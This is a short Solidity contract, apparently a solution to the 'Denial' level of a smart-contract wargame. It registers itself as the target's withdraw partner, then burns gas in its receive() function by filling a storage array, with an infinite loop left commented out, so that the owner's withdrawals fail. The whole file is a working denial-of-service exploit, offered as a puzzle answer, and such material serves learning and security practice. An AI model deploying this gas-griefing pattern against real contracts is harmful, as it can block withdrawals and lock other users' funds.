// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Denial} from "@main/20_Denial.sol";

contract DenialAttacker {
    Denial denial;
    address[] denialArray;

    constructor(address payable _denial) {
        denial = Denial(_denial);
        denial.setWithdrawPartner(address(this));
    }

    function attack() public payable {
        denial.withdraw();
    }

    receive() external payable {
        // close to 1 million gas ( 20k gas * around 50 storage)
        for (uint256 i = 0; i < 50; ++i) {
            denialArray.push(msg.sender);
        }
        // while (true) {}
    }
}
